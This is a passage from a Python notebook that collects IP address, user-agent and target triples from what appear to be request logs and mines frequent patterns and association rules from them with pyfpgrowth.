        print("Add (%s %s %s)" % (ip,ua,target))
        transactions.append([ip,ua,target])

# %%
transactions

# %%
patterns = pyfpgrowth.find_frequent_patterns(transactions, 3)
rules = pyfpgrowth.generate_association_rules(patterns, 0.9)
rules
